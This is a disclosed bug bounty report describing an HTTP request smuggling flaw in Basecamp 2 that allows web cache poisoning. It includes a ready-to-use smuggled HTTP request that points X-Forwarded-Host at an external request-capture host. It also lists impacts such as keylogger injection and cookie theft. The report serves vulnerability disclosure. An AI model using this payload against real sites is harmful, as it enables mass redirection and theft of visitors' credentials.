# HTTP request smuggling on Basecamp 2 allows web cache poisoning

## Metadata

- HackerOne Report ID: 919175
- Weakness: HTTP Request Smuggling
- Program: basecamp

- Has Bounty: Yes

- Substate: resolved

## Original Report

It is found that an authenticated Basecamp 2 user can desync front and backend servers and poison the socket with harmful response for the next visitor.  During redirect probe, It also appears that front-end infrastructure performs caching of content. Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request. This will make the attack persistent, affecting any user who subsequently requests the affected URL.

## Validation steps
**1.**  Open https://requestbin.com/r/enjv2g5042bg in your browser for request capturing.

**2.** Paste the following request in Burp repeater (I've embedded my session in the request for your ease):

```http
POST /4618984/account HTTP/1.1
Host: basecamp.com
Connection: keep-alive
Content-Length: 144
Accept: */*
X-CSRF-Token: BW5Kp3r1hLOuZI6+4GkBW5XUpkt55bi9tIiqgKFo1ZY=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

_method=patch&account%5Bname%5D=BC
0

GET /x HTTP/1.1
X-Forwarded-Host: enjv2g5042bg.x.pipedream.net
X-Forwarded-Proto: http
Foo: bar
```
Make sure to set the target to `https://basecamp.com` and port to `443`.

**3.** Issue the request in repeater.

**4.** Observe the captured request in RequestBin.com

## Impact

- With request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.

- By redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.

- It is also possible to capture visitors' request headers and cookies.
